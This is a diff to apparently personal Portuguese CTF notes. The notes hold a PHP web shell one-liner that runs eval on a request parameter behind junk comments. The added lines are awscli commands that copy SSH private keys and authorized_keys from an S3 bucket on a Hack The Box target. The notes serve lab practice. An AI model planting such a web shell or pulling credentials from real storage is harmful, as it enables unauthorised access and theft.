@@ -50,7 +50,10 @@
 - git clone https://github.com/thewhiteh4t/FinalRecon.git
 - <?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>
 - aws s3 são mt importantes, fazem parte de buckets de armazenamento. caso ache keys de s3 pode ser credenciais uteis para acessar esses bucktes atraves do awscli/aws configure. exemplo abaixo de como usei no ctf.
-- aws configure e depois aws --endpoint-url http://facts.htb:54321 s3 ls 
+- aws configure e depois aws --endpoint-url http://facts.htb:54321 s3 ls
+- aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .
+- aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
+
 
 ---
   
